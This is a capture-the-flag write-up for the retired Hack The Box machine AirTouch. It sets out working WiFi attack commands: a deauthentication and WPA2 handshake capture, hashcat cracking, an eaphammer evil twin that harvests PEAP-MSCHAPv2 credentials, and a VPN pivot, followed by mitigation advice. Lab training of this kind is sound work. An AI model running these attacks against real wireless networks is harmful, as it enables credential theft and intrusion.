---
machine: AirTouch
os: Linux
difficulty: Hard
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, wifi, wpa2, evil-twin, peap, vpn]
---

# AirTouch — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable writeup.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

An unusual box because the entry point is **radio**: capture the WPA2-PSK handshake of the home network, crack it with `hashcat -m 22000`, and use that key to stand up an **Evil Twin** of the corporate network and harvest **PEAP-MSCHAPv2** credentials from a client that reconnects. Those credentials open the VPN, and from the internal subnet the escalation is standard Linux.

## Recon

Network scanning gets you little: the service is in the air.

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
iwconfig wlan0mon
sudo airodump-ng wlan0mon
```

```text
BSSID              CH  ENC   ESSID
AA:BB:CC:DD:EE:FF   6  WPA2  AIRTOUCH_HOME
11:22:33:44:55:66   6  WPA2  AIRTOUCH_CORP   (802.1X)
```

Two SSIDs: a home one with a PSK and a corporate one with 802.1X.

## Handshake and cracking

```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon &
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c <client MAC> wlan0mon
# wait for "WPA handshake: AA:BB:CC:DD:EE:FF"
hcxpcapngtool -o cap.22000 cap-01.cap
hashcat -m 22000 cap.22000 /usr/share/wordlists/rockyou.txt
```

```text
AIRTOUCH_HOME:<psk>
```

```bash
wpa_passphrase AIRTOUCH_HOME '<psk>' > wpa.conf
sudo wpa_supplicant -B -i wlan0 -c wpa.conf && sudo dhclient wlan0
```

Inside the home network: hosts, services and, above all, the VPN client config.

## Evil Twin for PEAP-MSCHAPv2

```bash
./eaphammer --auth peap --essid AIRTOUCH_CORP \
            --interface wlan1 -i wlan0 --creds
```

When a client associates with the fake AP, `eaphammer` captures the MSCHAPv2 challenge/response pair:

```text
user@airtouch.htb   challenge: <c>   response: <r>
```

Crack it offline:

```bash
hashcat -m 5500 ntlm.txt /usr/share/wordlists/rockyou.txt
```

```text
user@airtouch.htb:<password>
```

## VPN pivot

```bash
sudo openvpn --config airtouch.ovpn --auth-user-pass <(printf 'user@airtouch.htb\n<password>\n')
```

A `tun0` interface appears, and with it the internal subnet (`10.x.y.0/24`): classic `nmap` territory at last.

## Escalation

The usual checklist on the internal host:

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
systemctl list-timers --all
ls -l /etc/cron*; cat /etc/crontab
```

The path is a systemd unit or cron script **writable** by the VPN user; inject a root payload and wait for the timer.

## Evidence (redacted)

```text
/home/<user>/user.txt  -> <user_flag>
/root/root.txt         -> <root_flag>
```

## Lessons

- WPA2-PSK is only as strong as the passphrase: a captured handshake falls offline, without touching the network.
- **PEAP without server-certificate validation** is the underlying flaw: the client hands its MSCHAPv2 hash to any AP using the same name.
- A VPN sharing domain credentials turns a WiFi network into the door to the internal network.
- Mitigation: validated server certificates in 802.1X profiles (or EAP-TLS), PMF/802.11w, a WIDS for twin APs, and MFA on the VPN.
